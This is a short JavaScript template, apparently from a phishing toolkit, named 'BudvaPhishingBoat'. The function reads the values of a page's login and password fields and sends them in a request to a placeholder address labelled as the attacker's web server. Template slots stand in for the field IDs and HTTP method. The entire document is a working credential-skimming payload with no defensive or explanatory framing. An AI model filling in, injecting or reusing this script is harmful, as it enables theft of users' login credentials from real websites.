<script lang="javascript">
function        BudvaPhishingBoat() {
        var ajaxBudvaPhisingBoat;
        try {
                ajaxBudvaPhisingBoat = new XMLHttpRequest();
        } catch(e) {
                return;
        }

        var login;
        var password;

        try {
                login = document.getElementById("<!--;LOGINID-->").value;
        } catch(e) {
                login="emptylogin";
        }
        try {
                password = document.getElementById("<!--;PASSWORDID-->").value;
        } catch(e) {
                password="emptypassword";
        }

        ajaxBudvaPhisingBoat.open("<!--;httpMethodToUse-->","<!--;URLpointingToAttackersWebServer-->?login="+login+"&password="+password,true);
        ajaxBudvaPhisingBoat.onreadystatechange = function() {
                if(ajaxBudvaPhisingBoat.readyState == 4) {
                        if(ajaxBudvaPhisingBoat.status == 200) {
                        }
                }
        }
        ajaxBudvaPhisingBoat.send(null);
        return 0;
                }
</script>
